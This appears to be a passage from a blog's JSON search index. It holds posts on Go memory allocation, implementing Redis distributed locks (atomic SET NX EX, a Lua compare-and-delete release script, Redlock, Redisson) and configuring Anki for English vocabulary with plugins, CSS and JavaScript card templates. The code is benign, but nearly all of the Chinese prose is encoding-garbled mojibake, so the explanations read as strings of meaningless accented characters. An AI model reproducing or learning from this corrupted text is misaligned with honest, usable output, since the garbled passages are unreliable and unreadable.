å°äº16å­—èŠ‚ï¼Œmcacheï¼Œå¤§äº32Kï¼Œmheapï¼Œä¸­é—´å…ˆä»macheï¼Œé€çº§å‘ä¸Šç”³è¯·ã€‚\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/jiujuan/p/13922551.html\n+ http://legendtkl.com/2017/04/02/golang-alloc/\n+ https://zhuanlan.zhihu.com/p/352133292\n\n+ https://draveness.me/golang/docs/part3-runtime/ch07-memory/golang-memory-allocator/\n\n+ https://learnku.com/articles/68142\n\n\n\n","tags":["golang"],"categories":["2_golangåº•å±‚"]},{"title":"redisåˆ†å¸ƒå¼é”çš„å®ç°","url":"%2Fp%2Fe4e467c6.html","content":"\n# 1. åˆ†å¸ƒå¼é”\n\n### 1.1 ç‰¹ç‚¹\n\n- äº’æ–¥æ€§ï¼š åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªçº¿ç¨‹æŒæœ‰é”\n- å¯é‡å…¥æ€§ï¼š åŒä¸€èŠ‚ç‚¹ä¸Šçš„åŒä¸€ä¸ªçº¿ç¨‹å¦‚æœè·å–äº†é”ä¹‹åèƒ½å¤Ÿå†æ¬¡è·å–é”\n- é”è¶…æ—¶ï¼šå’ŒJ.U.Cä¸­çš„é”ä¸€æ ·æ”¯æŒé”è¶…æ—¶ï¼Œé˜²æ­¢æ­»é”\n- é«˜æ€§èƒ½å’Œé«˜å¯ç”¨ï¼š åŠ é”å’Œè§£é”éœ€è¦é«˜æ•ˆï¼ŒåŒæ—¶ä¹Ÿéœ€è¦ä¿è¯é«˜å¯ç”¨ï¼Œé˜²æ­¢åˆ†å¸ƒå¼é”å¤±æ•ˆ\n- å…·å¤‡é˜»å¡å’Œéé˜»å¡æ€§ï¼šèƒ½å¤ŸåŠæ—¶ä»é˜»å¡çŠ¶æ€ä¸­è¢«å”¤é†’\n\n### 1.2 å®ç°æ–¹å¼\n\næˆ‘ä»¬ä¸€èˆ¬å®ç°åˆ†å¸ƒå¼é”æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š\n\n- åŸºäºæ•°æ®åº“\n- åŸºäºRedis\n- åŸºäºzookeeper\n\n<!-- more -->\n\n# 2. Rediså®ç°æ–¹æ¡ˆ\n\n### 2.1 å®ç°åŸç†\n\næƒ³è¦å®ç°åˆ†å¸ƒå¼é”ï¼Œå¿…é¡»è¦æ±‚ Redis æœ‰ã€Œäº’æ–¥ã€çš„èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ SETNX å‘½ä»¤ï¼Œè¿™ä¸ªå‘½ä»¤è¡¨ç¤ºSET If Not Existsï¼Œå³å¦‚æœ key ä¸å­˜åœ¨ï¼Œæ‰ä¼šè®¾ç½®å®ƒçš„å€¼ï¼Œå¦åˆ™ä»€ä¹ˆä¹Ÿä¸åšã€‚\n\nåŠ é”å‘½ä»¤ï¼šSETNX key valueï¼Œå½“é”®ä¸å­˜åœ¨æ—¶ï¼Œå¯¹é”®è¿›è¡Œè®¾ç½®æ“ä½œå¹¶è¿”å›æˆåŠŸï¼Œå¦åˆ™è¿”å›å¤±è´¥ã€‚KEY æ˜¯é”çš„å”¯ä¸€æ ‡è¯†ï¼Œä¸€èˆ¬æŒ‰ä¸šåŠ¡æ¥å†³å®šå‘½åã€‚\nè§£é”å‘½ä»¤ï¼šDEL keyï¼Œé€šè¿‡åˆ é™¤é”®å€¼å¯¹é‡Šæ”¾é”ï¼Œä»¥ä¾¿å…¶ä»–çº¿ç¨‹å¯ä»¥é€šè¿‡ SETNX å‘½ä»¤æ¥è·å–é”ã€‚\né”è¶…æ—¶ï¼šEXPIRE key timeout, è®¾ç½® key çš„è¶…æ—¶æ—¶é—´ï¼Œä»¥ä¿è¯å³ä½¿é”æ²¡æœ‰è¢«æ˜¾å¼é‡Šæ”¾ï¼Œé”ä¹Ÿå¯ä»¥åœ¨ä¸€å®šæ—¶é—´åè‡ªåŠ¨é‡Šæ”¾ï¼Œé¿å…èµ„æºè¢«æ°¸è¿œé”ä½ã€‚\n\nåŠ é”è§£é”ä¼ªä»£ç å¦‚ä¸‹ï¼š\n\n```c\nif (setnx(key, 1) == 1){\n    expire(key, 30)\n    try {\n        //TODO ä¸šåŠ¡é€»è¾‘\n    } finally {\n        del(key)\n    }\n}\n```\n\n### 2.2 åŠ é”\n\n##### SETNX å’Œ EXPIRE (é”™è¯¯)\n\nå¦‚æœ SETNX æˆåŠŸï¼Œåœ¨è®¾ç½®é”è¶…æ—¶æ—¶é—´åï¼ŒæœåŠ¡å™¨æŒ‚æ‰ã€é‡å¯æˆ–ç½‘ç»œé—®é¢˜ç­‰ï¼Œå¯¼è‡´ EXPIRE å‘½ä»¤æ²¡æœ‰æ‰§è¡Œï¼Œé”æ²¡æœ‰è®¾ç½®è¶…æ—¶æ—¶é—´å˜æˆæ­»é”ã€‚\n\n##### SET åŸå­å‘½ä»¤ï¼ˆæ­£ç¡®ï¼‰\n\nä»Redis 2.6.12 ç‰ˆæœ¬å¼€å§‹ï¼ŒSETå‘½ä»¤å¯ä»¥é€šè¿‡å‚æ•°æ¥å®ç°å’ŒSETNXã€SETEXã€PSETEX ä¸‰ä¸ªå‘½ä»¤ç›¸åŒçš„æ•ˆæœã€‚\n\n```bash\nSET key value NX EX seconds\n```\n\nåŠ ä¸ŠNXã€EXå‚æ•°åï¼Œæ•ˆæœå°±ç›¸å½“äºSETEXï¼Œè¿™ä¹Ÿæ˜¯Redisè·å–é”å†™æ³•é‡Œé¢æœ€å¸¸è§çš„ã€‚\n\n### 2.3 é‡Šæ”¾é”\n\n##### VALUE å”¯ä¸€æ€§\n\nvalueå¿…é¡»è¦å…·æœ‰å”¯ä¸€æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨UUIDæ¥åšï¼Œè®¾ç½®éšæœºå­—ç¬¦ä¸²ä¿è¯å”¯ä¸€æ€§ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦ä¿è¯å”¯ä¸€æ€§ï¼Ÿå‡å¦‚valueä¸æ˜¯éšæœºå­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ä¸€ä¸ªå›ºå®šå€¼ï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨ä¸‹é¢çš„é—®é¢˜ï¼š\n\n- 1.å®¢æˆ·ç«¯1è·å–é”æˆåŠŸ\n- 2.å®¢æˆ·ç«¯1åœ¨æŸä¸ªæ“ä½œä¸Šé˜»å¡äº†å¤ªé•¿æ—¶é—´\n- 3.è®¾ç½®çš„keyè¿‡æœŸäº†ï¼Œé”è‡ªåŠ¨é‡Šæ”¾äº†\n- 4.å®¢æˆ·ç«¯2è·å–åˆ°äº†å¯¹åº”åŒä¸€ä¸ªèµ„æºçš„é”\n- 5.å®¢æˆ·ç«¯1ä»é˜»å¡ä¸­æ¢å¤è¿‡æ¥ï¼Œå› ä¸ºvalueå€¼ä¸€æ ·ï¼Œæ‰€ä»¥æ‰§è¡Œé‡Šæ”¾é”æ“ä½œæ—¶å°±ä¼šé‡Šæ”¾æ‰å®¢æˆ·ç«¯2æŒæœ‰çš„é”ï¼Œè¿™æ ·å°±ä¼šé€ æˆé—®é¢˜\n\næ‰€ä»¥é€šå¸¸æ¥è¯´ï¼Œåœ¨é‡Šæ”¾é”æ—¶ï¼Œæˆ‘ä»¬éœ€è¦å¯¹valueè¿›è¡ŒéªŒè¯\n\n##### GET åå¯¹æ¯”è‡ªå·±å¹¶ DEL\n\né‡Šæ”¾é”æ—¶ä¸èƒ½ç›´æ¥ç”¨del keyè¿™ç§ç²—æš´çš„æ–¹å¼ï¼Œå› ä¸ºç›´æ¥del keyä»»ä½•å®¢æˆ·ç«¯éƒ½å¯ä»¥è¿›è¡Œè§£é”äº†ï¼Œæ‰€ä»¥è§£é”æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ¤æ–­é”æ˜¯å¦æ˜¯è‡ªå·±çš„ï¼ŒåŸºäºvalueå€¼æ¥åˆ¤æ–­ã€‚\n\næ‰€ä»¥æˆ‘ä»¬å¿…é¡»å…ˆç¡®ä¿å½“å‰é‡Šæ”¾é”çš„çº¿ç¨‹æ˜¯æŒæœ‰è€…ï¼Œæ²¡é—®é¢˜äº†å†åˆ é™¤ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå°±å˜æˆä¸¤ä¸ªæ­¥éª¤äº†ï¼Œä¼¼ä¹åˆè¿èƒŒäº†åŸå­æ€§äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”¨luaè„šæœ¬æŠŠä¸¤æ­¥æ“ä½œåšæ‹¼è£…ï¼š\n\n```java\npublic boolean releaseLock_with_lua(String key,String value) {\n    String luaScript = \"if redis.call('get',KEYS[1]) == ARGV[1] then \" +\n            \"return redis.call('del',KEYS[1]) else return 0 end\";\n    return jedis.eval(luaScript, Collections.singletonList(key), Collections.singletonList(value)).equals(1L);\n}\n```\n\n\nKEYS[1]æ˜¯å½“å‰keyçš„åç§°ï¼ŒARGV[1]å¯ä»¥æ˜¯å½“å‰çº¿ç¨‹çš„ID(æˆ–è€…å…¶ä»–ä¸å›ºå®šçš„å€¼ï¼Œèƒ½è¯†åˆ«æ‰€å±çº¿ç¨‹å³å¯)ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æŒæœ‰è¿‡æœŸé”çš„çº¿ç¨‹ï¼Œæˆ–è€…å…¶ä»–çº¿ç¨‹è¯¯åˆ ç°æœ‰é”çš„æƒ…å†µå‡ºç°ã€‚\n\n### 2.3 å®ç°é—®é¢˜æ€»ç»“\n\n##### **æ­»é”**\n\nè®¾ç½®è¿‡æœŸæ—¶é—´å³å¯\n\n##### é”è¢«åˆ«äººé‡Šæ”¾\n\né”å†™å…¥å”¯ä¸€æ ‡è¯†ï¼Œé‡Šæ”¾é”å…ˆæ£€æŸ¥æ ‡è¯†ï¼Œå†é‡Šæ”¾ã€‚\n\n##### é”è¿‡æœŸæ—¶é—´åˆ°äº†è¿˜æ²¡å¹²å®Œæ´»\n\né”çš„è¿‡æœŸæ—¶é—´å¦‚æœè¯„ä¼°ä¸å¥½ï¼Œè¿™ä¸ªé”å°±ä¼šæœ‰ã€Œæå‰ã€è¿‡æœŸçš„é£é™©ã€‚\n\nåŠ é”æ—¶ï¼Œå…ˆè®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ï¼Œç„¶åæˆ‘ä»¬å¼€å¯ä¸€ä¸ªã€Œå®ˆæŠ¤çº¿ç¨‹ã€ï¼Œå®šæ—¶å»æ£€æµ‹è¿™ä¸ªé”çš„å¤±æ•ˆæ—¶é—´ï¼Œå¦‚æœé”å¿«è¦è¿‡æœŸäº†ï¼Œæ“ä½œå…±äº«èµ„æºè¿˜æœªå®Œæˆï¼Œé‚£ä¹ˆå°±è‡ªåŠ¨å¯¹é”è¿›è¡Œã€Œç»­æœŸã€ï¼Œé‡æ–°è®¾ç½®è¿‡æœŸæ—¶é—´ã€‚\n\nå¦‚æœä½ æ˜¯ Java æŠ€æœ¯æ ˆï¼Œå¹¸è¿çš„æ˜¯ï¼Œå·²ç»æœ‰ä¸€ä¸ªåº“æŠŠè¿™äº›å·¥ä½œéƒ½å°è£…å¥½äº†ï¼šRedissonã€‚\n\n##### å•ç‚¹é—®é¢˜\n\n1. å®¢æˆ·ç«¯ 1 åœ¨ä¸»åº“ä¸Šæ‰§è¡Œ SET å‘½ä»¤ï¼ŒåŠ é”æˆåŠŸ\n2. æ­¤æ—¶ï¼Œä¸»åº“å¼‚å¸¸å®•æœºï¼ŒSET å‘½ä»¤è¿˜æœªåŒæ­¥åˆ°ä»åº“ä¸Šï¼ˆä¸»ä»å¤åˆ¶æ˜¯å¼‚æ­¥çš„ï¼‰\n3. ä»åº“è¢«å“¨å…µæå‡ä¸ºæ–°ä¸»åº“ï¼Œè¿™ä¸ªé”åœ¨æ–°çš„ä¸»åº“ä¸Šï¼Œä¸¢å¤±äº†ï¼\n\nä¸ºæ­¤ï¼ŒRedis çš„ä½œè€…æå‡ºä¸€ç§è§£å†³æ–¹æ¡ˆï¼Œå°±æ˜¯æˆ‘ä»¬ç»å¸¸å¬åˆ°çš„ Redlockï¼ˆçº¢é”ï¼‰ã€‚\n\n# 3.  Redlock ç®—æ³•\n\n### 3.1 å‰æ\n\nRedlock çš„æ–¹æ¡ˆåŸºäº 2 ä¸ªå‰æï¼š\n\n1. ä¸å†éœ€è¦éƒ¨ç½²ä»åº“å’Œå“¨å…µå®ä¾‹ï¼Œåªéƒ¨ç½²ä¸»åº“\n2. ä½†ä¸»åº“è¦éƒ¨ç½²å¤šä¸ªï¼Œå®˜æ–¹æ¨èè‡³å°‘ 5 ä¸ªå®ä¾‹\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œæƒ³ç”¨ä½¿ç”¨ Redlockï¼Œä½ è‡³å°‘è¦éƒ¨ç½² 5 ä¸ª Redis å®ä¾‹ï¼Œè€Œä¸”éƒ½æ˜¯ä¸»åº“ï¼Œå®ƒä»¬ä¹‹é—´æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œéƒ½æ˜¯ä¸€ä¸ªä¸ªå­¤ç«‹çš„å®ä¾‹ã€‚\n\n**æ³¨æ„ï¼šä¸æ˜¯éƒ¨ç½² Redis Clusterï¼Œå°±æ˜¯éƒ¨ç½² 5 ä¸ªç®€å•çš„ Redis å®ä¾‹ã€‚**\n\n### 3.2 æµç¨‹\n\næ•´ä½“çš„æµç¨‹æ˜¯è¿™æ ·çš„ï¼Œä¸€å…±åˆ†ä¸º 5 æ­¥ï¼š\n\n1. å®¢æˆ·ç«¯å…ˆè·å–ã€Œå½“å‰æ—¶é—´æˆ³T1ã€\n2. å®¢æˆ·ç«¯ä¾æ¬¡å‘è¿™ 5 ä¸ª Redis å®ä¾‹å‘èµ·åŠ é”è¯·æ±‚ï¼ˆç”¨å‰é¢è®²åˆ°çš„ SET å‘½ä»¤ï¼‰ï¼Œä¸”æ¯ä¸ªè¯·æ±‚ä¼šè®¾ç½®è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’çº§ï¼Œè¦è¿œå°äºé”çš„æœ‰æ•ˆæ—¶é—´ï¼‰ï¼Œå¦‚æœæŸä¸€ä¸ªå®ä¾‹åŠ é”å¤±è´¥ï¼ˆåŒ…æ‹¬ç½‘ç»œè¶…æ—¶ã€é”è¢«å…¶å®ƒäººæŒæœ‰ç­‰å„ç§å¼‚å¸¸æƒ…å†µï¼‰ï¼Œå°±ç«‹å³å‘ä¸‹ä¸€ä¸ª Redis å®ä¾‹ç”³è¯·åŠ é”\n3. å¦‚æœå®¢æˆ·ç«¯ä» >=3 ä¸ªï¼ˆå¤§å¤šæ•°ï¼‰ä»¥ä¸Š Redis å®ä¾‹åŠ é”æˆåŠŸï¼Œåˆ™å†æ¬¡è·å–ã€Œå½“å‰æ—¶é—´æˆ³T2ã€ï¼Œå¦‚æœ T2 - T1 < é”çš„è¿‡æœŸæ—¶é—´ï¼Œæ­¤æ—¶ï¼Œè®¤ä¸ºå®¢æˆ·ç«¯åŠ é”æˆåŠŸï¼Œå¦åˆ™è®¤ä¸ºåŠ é”å¤±è´¥\n4. åŠ é”æˆåŠŸï¼Œå»æ“ä½œå…±äº«èµ„æºï¼ˆä¾‹å¦‚ä¿®æ”¹ MySQL æŸä¸€è¡Œï¼Œæˆ–å‘èµ·ä¸€ä¸ª API è¯·æ±‚ï¼‰\n5. åŠ é”å¤±è´¥ï¼Œå‘ã€Œå…¨éƒ¨èŠ‚ç‚¹ã€å‘èµ·é‡Šæ”¾é”è¯·æ±‚ï¼ˆå‰é¢è®²åˆ°çš„ Lua è„šæœ¬é‡Šæ”¾é”ï¼‰\n\n### 3.3 äº‰è®º\n\nå‚è€ƒ Martin å’Œ redis ä½œè€…çš„äº‰è®º\n\nçº¢é”çš„é—®é¢˜åœ¨äºï¼šåŠ é”å’Œè§£é”çš„å»¶è¿Ÿè¾ƒå¤§ã€‚éš¾ä»¥åœ¨é›†ç¾¤ç‰ˆæˆ–è€…æ ‡å‡†ç‰ˆï¼ˆä¸»ä»æ¶æ„ï¼‰çš„Rediså®ä¾‹ä¸­å®ç°ã€‚å°½é‡ä¸ç”¨å®ƒï¼Œè€Œä¸”å®ƒçš„æ€§èƒ½ä¸å¦‚å•æœºç‰ˆ Redisï¼Œéƒ¨ç½²æˆæœ¬ä¹Ÿé«˜ã€‚\n\n# 4. å¤´è„‘é£æš´\n\n+ SET EX PX NX + æ ¡éªŒå”¯ä¸€éšæœºå€¼ï¼Œ å¯¹æ¯”åå†é‡Šæ”¾é”ã€‚\n\n+ é”è¿‡æœŸäº†æ´»æ²¡å¹²å®Œï¼Œå°±è¦æ¶‰åŠåˆ°ç»­æœŸã€‚\n\n+ JAVAå¼€æºæ¡†æ¶:Redisson\n\n  åªè¦çº¿ç¨‹ä¸€åŠ é”æˆåŠŸï¼Œå°±ä¼šå¯åŠ¨ä¸€ä¸ª`watch dog`çœ‹é—¨ç‹—ï¼Œå®ƒæ˜¯ä¸€ä¸ªåå°çº¿ç¨‹ï¼Œä¼šæ¯éš”10ç§’æ£€æŸ¥ä¸€ä¸‹ï¼Œå¦‚æœçº¿ç¨‹1è¿˜æŒæœ‰é”ï¼Œé‚£ä¹ˆå°±ä¼šä¸æ–­çš„å»¶é•¿é”keyçš„ç”Ÿå­˜æ—¶é—´ã€‚å› æ­¤ï¼ŒRedissonå°±æ˜¯ä½¿ç”¨Redissonè§£å†³äº†é”è¿‡æœŸé‡Šæ”¾ï¼Œä¸šåŠ¡æ²¡æ‰§è¡Œå®Œé—®é¢˜ã€‚\n\n+ GOçš„å¼€æºåº“ https://github.com/go-redsync/redsync\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://juejin.cn/post/6844903830442737671\n+ http://kaito-kidd.com/2021/06/08/is-redis-distributed-lock-really-safe/\n+ https://redis.io/topics/distlock\n+ https://github.com/go-redsync/redsync","tags":["redis"],"categories":["redis"]},{"title":"ankiä¹‹è‹±è¯­å•è¯ç¯‡","url":"%2Fp%2Fa2ff337b.html","content":"\nå¸‚é¢ä¸Šå·²ç»æœ‰å¤ªå¤šçš„èƒŒå•è¯è½¯ä»¶ï¼Œä¾‹å¦‚ç™¾è¯æ–©ï¼Œæ‰‡è´ï¼Œä¸èƒŒå•è¯ï¼Œå¢¨å¢¨èƒŒå•è¯ï¼Œä¹‹å‰æˆ‘ç”¨çš„æœ€å¤šçš„æ˜¯çŸ¥ç±³èƒŒå•è¯ï¼Œç°åœ¨æ‰å‘ç°èƒŒå•è¯è½¯ä»¶çš„å°½å¤´æ˜¯Ankiã€‚\n\n# 1. å•è¯æ¥æº\n\n### 1.1 åˆ’è¯\n\nchromeä¸Šé‡åˆ°ä¸ä¼šçš„å•è¯ï¼Œç›´æ¥åŠ å…¥åˆ°å¡ç‰‡é‡Œã€‚\n\næ¨è2ä¸ªæ’ä»¶ï¼Œä¸€ä¸ªæ˜¯å•è¯å‘ç°è€…ã€‚ä¸€ä¸ªæ˜¯odhåˆ’è¯åˆ¶å¡ã€‚\n\n<!-- more -->\n\n+ å•è¯å‘ç°è€…\n\nhttps://chrome.google.com/webstore/detail/word-discoverer-expand-yo/noncaeikjgpbdeoocblijjgegnobogib?hl=zh-CN\n\nçªå‡ºæ˜¾ç¤ºç½‘é¡µä¸Šç½•è§çš„è‹±è¯­å­—å…¸è¯æ±‡å’Œæƒ¯ç”¨è¯­ã€‚ä¿ƒè¿›è‹±è¯­è¯­è¨€å­¦ä¹ å¹¶æ‰©å¤§è¯æ±‡é‡ã€‚å¯ä»¥è®¾ç½®è‡ªå·±çš„å•è¯é‡ï¼Œä¸è®¤è¯†çš„å•è¯æ ‡çº¢æ˜¾ç¤ºã€‚\n\n<img src=\"ankiä¹‹è‹±è¯­å•è¯ç¯‡/image-20220117174933649.png\" alt=\"image-20220117174933649\" style=\"zoom:50%;\" />\n\n+ ODHåˆ¶å¡\n\nhttps://chrome.google.com/webstore/detail/online-dictionary-helper/lppjdajkacanlmpbbcdkccjkdbpllajb?hl=en\n\né‡åˆ°ä¸ä¼šçš„å•è¯å¯ä»¥å¿«é€ŸAnkiåˆ¶å¡ï¼Œæ³¨æ„è¿™ä¸ªéœ€è¦Ankiçš„å¯åŠ¨ï¼Œå¹¶ä¸”å®‰è£…äº†Anki connectçš„æ’ä»¶ã€‚\n\n<img src=\"ankiä¹‹è‹±è¯­å•è¯ç¯‡/image-20220117174845031.png\" alt=\"image-20220117174845031\" style=\"zoom: 50%;\" />\n\n### 1.2 æŸ¥è¯\n\næ‰‹æœºä¸Šé‡åˆ°ä¸ä¼šçš„å•è¯ï¼Œå¯ä»¥è¿›è¡Œå­—å…¸æŸ¥è¯¢ï¼Œé‡ç‚¹æ¨èæ¬§é™†è¯å…¸ã€‚\n\næŸ¥å®Œå¯ä»¥åŠ å…¥æ¬§è·¯è¯å…¸çš„ç”Ÿè¯æœ¬ï¼Œç„¶åå¯¼å‡ºåˆ°Ankié‡Œã€‚\n\n\n\n### 1.3 COCA20000\n\nCOCAçš„ç¾å›½å½“ä»£è¯­æ–™åº“ä¸­æœ€å¸¸ç”¨çš„20000è¯æ±‡ï¼Œå…¶å½¢å¼æ˜¯åŒ…æ‹¬edï¼Œingï¼Œlyç­‰ä¸€ä¸ªå•è¯çš„å¤šç§å½¢å¼çš„çœŸæ­£2ä¸‡è¯æ±‡ï¼Œè€Œä¸æ˜¯ä¼°ç®—çš„2ä¸‡ã€‚\n\nåšå‡æ³•çš„è¯æ±‡è¡¨æ¯”åšåŠ æ³•çš„è¯æ±‡è¡¨ï¼Œè¦æ¥çš„æœ‰æˆå°±æ„Ÿå’Œç›®çš„æ€§ã€‚å› ä¸ºä½ çŸ¥é“æ€»é‡å°±è¿™äº›ï¼Œä½ ä¼šè¶Šåˆ’è¶Šå°‘ï¼Œè€Œä¸æ˜¯æ¯æ¬¡éƒ½åœ¨æƒ³ï¼Œè¿˜å°‘äº†ç‚¹ä»€ä¹ˆã€‚å› ä¸ºè¶…å‡ºè¿™ä¸ªèŒƒå›´çš„å•è¯ï¼Œå°±æ˜¯ä¸éœ€è¦èƒŒçš„ã€‚\n\nåœ¨å¤ä¹ çš„æ—¶å€™ï¼Œå¦‚æœè§‰å¾—æŸå•è¯å¤ªç®€å•ï¼Œç›´æ¥æš‚åœ (suspend) ï¼Œä»¥åå°±ä¸ä¼šå†è·‘å‡ºæ¥è¦æ±‚å¤ä¹ äº†ã€‚åœ¨Ankiæµè§ˆå™¨é‡Œï¼Œç”¨ deck:COCA20000 is:suspended(æˆ–è€…deck:COCA20000 -is:suspended) ç­›é€‰æç½®æˆ–è€…éæç½®é¡¹ã€‚\n\nå¯ä»¥å»è¿™ä¸ªåœ°å€ä¸‹è½½ï¼š https://www.laohuang.net/20170226/anki-coca-20000-source-text/\n\n\n\n# 2. Ankié…ç½®\n\næ‰€æœ‰æ’ä»¶åªèƒ½åœ¨æ¡Œé¢ç«¯ä½¿ç”¨ï¼Œä¸èƒ½åœ¨ç§»åŠ¨ç«¯ä½¿ç”¨ï¼Œå¹¶ä¸”æ’ä»¶æ˜¯ä¸ä¼šåŒæ­¥çš„ã€‚\n\n### 2.0 å®‰è£…æ’ä»¶\n\nèœå•æ -> å·¥å…· -> æ’ä»¶ -> è¾“å…¥æ’ä»¶ç¼–ç \n\n### 2.1 å¿…è£…æ’ä»¶\n\n+ AnkiConnect\n\nè¿æ¥Ankiï¼Œä¸è£…æ— æ³•chromeå¿«é€Ÿåˆ¶å¡ã€‚\nhttps://ankiweb.net/shared/info/2055492159\n\n### 2.2 ç¼–è¾‘å­—æ®µæ’ä»¶\n\n+ Advanced Browser\n\nå¯ä»¥å¢åŠ Ankiæµè§ˆå™¨ï¼Œå¯¹éšè—å­—æ®µæ’åºã€‚\nhttps://ankiweb.net/shared/info/874215009\n\n+ Fast Word Query\n\næŸ¥è¯¢å•è¯çš„å„ç§å«ä¹‰ã€‚\nhttps://ankiweb.net/shared/info/1807206748\n\n+ Edit Field During Review\n\nå¯ä»¥åœ¨é¢„è§ˆçš„æ—¶å€™ï¼Œç¼–è¾‘å­—æ®µã€‚\nhttps://ankiweb.net/shared/info/1020366288\n\n+ Google Translate\n\nå¯ä»¥ç”¨å­—æ®µè¿›è¡Œè°·æ­Œç¿»è¯‘ã€‚\nhttps://ankiweb.net/shared/info/1536291224\n\n### 2.3 ä½¿ç”¨æå‡æ’ä»¶\n\n+ Remaining time (for Anki 2.1)\n\næ˜¾ç¤ºèƒŒå•è¯è¿›åº¦å’ŒçŠ¶æ€ã€‚\nhttps://ankiweb.net/shared/info/1508357010\n\n+ Speed Focus Mode (auto-alert, auto-reveal, auto-fail)\n\nè‡ªåŠ¨å¸®ä½ æ˜¾ç¤ºç­”æ¡ˆå’Œä¸ä¼šã€‚\nhttps://ankiweb.net/shared/info/1046608507\n\n### 2.4  å¤œé—´æ¨¡å¼\n\næ–°ç‰ˆæœ¬å¯ä»¥ç›´æ¥å¼€å¯å¤œé—´æ¨¡å¼ï¼Œä¸å†éœ€è¦å®‰è£…æ’ä»¶ã€‚ä¸è¿‡å¤œé—´æ¨¡å¼ï¼ˆnightModeï¼‰ä¼šæŠŠé¡µé¢èƒŒæ™¯è°ƒæˆæ·±è‰²ï¼Œè‹¥æ–‡æœ¬é¢œè‰²ä»ä¸ºé»‘è‰²ï¼ˆæˆ–æ˜¯æ·±è‰²ï¼‰ï¼Œè¯»è€…ä¼šæ ¹æœ¬çœ‹ä¸è§ã€æˆ–æ˜¯å¾ˆéš¾çœ‹æ¸…æ–‡æœ¬ã€‚\n\nIf you wanted a lighter grey background, you could use something like:\n\n```css\n.card.nightMode { background-color: #555; }\n```\n\nIf you have a â€˜myclassâ€™ style, the following would show the text in yellow when night mode is enabled:\n\n```css\n.nightMode .myclass { color: yellow; }\n```\n\n\n\n### 2.5 è‡ªåŠ¨æ’­æ”¾ç‰¹å®šéŸ³é¢‘\n\nankiåªèƒ½è®¾ç½®å…¨å±€è‡ªåŠ¨æ’­æ”¾ï¼Œå’Œå…¨å±€éè‡ªåŠ¨æ’­æ”¾ï¼Œå¯ä»¥é€šè¿‡jsè®¾ç½®ã€‚\n\n1. Create a new options group and uncheck \"Automatically play audio\". You already did that.\n\n2. Put the field with the audio you want to autoplay between divs, spans, etc (see code below).\n\n3. Give an id or class to the div. You can call it whatever you want, but make sure that it matches the ones inside the querySelector. I called mine \"autoplay\".\n\n4. Copy and paste the script below at the end of the section you want the audio to play (Back, in my case).\n\n   ```html\n    <div  id=\"autoplay\">{{de_audio}}</div>\n    \n    <script>\n    \n    \tvar elem = document.querySelector(\"#autoplay .soundLink, #autoplay .replaybutton\");\n    \tif (elem) {\n    \t\telem.click();\n    \t}\n    \n    </script>\n   ```\n\n\n\n# 3. FastWordQuery\n\n### 3.0 å¯¼å…¥è¯åº“\n\næ‰€æœ‰å•è¯æ¥æºï¼Œæˆ‘éƒ½ä¼šé€šè¿‡FastWordQueryè¿›è¡ŒæŸ¥è¯å¡«å……å­—æ®µï¼Œç„¶åä½¿ç”¨è‡ªå·±é…åˆåˆ¶ä½œçš„FastWQæ¨¡æ¿ã€‚\n\n### 3.1 æœ€ç»ˆé…ç½®\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175502987.png\" alt=\"image-20220117175502987\" style=\"zoom:50%;\" />\n\n\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175107545.png\" alt=\"image-20220117175107545\" style=\"zoom: 33%;\" />\n\n### 3.2 æµ‹è¯•OKé…ç½®\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175621839.png\" alt=\"image-20220117175621839\" style=\"zoom:32%;\" />\n\n<img src=\"anki%E4%B9%8B%E8%8B%B1%E8%AF%AD%E5%8D%95%E8%AF%8D%E7%AF%87/image-20220117175656109.png\" alt=\"image-20220117175656109\" style=\"zoom: 33%;\" />\n\n### 3.3 fastWQæ¨¡æ¿\n\n+ æ­£é¢æ¨¡æ¿\n\n  ```html\n  <div id=\"english\" class=\"section\">{{è‹±è¯­å•è¯}}\n  <span class=\"voice\" id=\"\">{{è‹±éŸ³}} </span>\n  <span class=\"voice\" id=\"autoplay\"> {{ç¾éŸ³}} </span>\n  \n  <div class=\"phonetic\">{{éŸ³æ ‡}}</div>\n  <div id=\"star\" class=\"extension\"></div>\n  \n  <div id=\"\" class=\"extension\">{{edit:å–è¯åŸå¥}}</div>\n  \n  <div id=\"vocab\" class=\"section\">explain:</div>\n  <div id=\"ext_vocab1\">\n  <div class=\"extension\">{{vocçŸ­}}</div>\n  <div class=\"extension\">{{vocé•¿}}</div>\n  </div>\n  \n  <div>\n  <div id=\"kelin1\" class=\"extension\">example:</div>\n  <div id=\"kelin\" class=\"extension\">{{æŸ¯æ—æ–¯}}</div>\n  </div>\n  \n  </div>\n  \n  <script>\n  var str = document.getElementById(\"kelin\").innerHTML;\n  \n  // æŸ¯æ—æ–¯æ˜Ÿçº§åŠ ä¸Š\n  var star = \"\";\n  var index = str.indexOf(\"</h4>\");\n  if (index > 0) {\n       star = str.substring(0, index);\n  }\n  document.getElementById(\"star\").innerHTML=star; \n  \n  // æå–ä¾‹å¥\n  var output = \"\";\n  var pattern = new RegExp(\"[\\u4E00-\\u9FA5]+\");\n  var arr=str.split(\"<p class=\\\"secondary\\\">\");\n  for (let i = 0; i < arr.length; ++i) {\n      var line = arr[i]\n      var index = 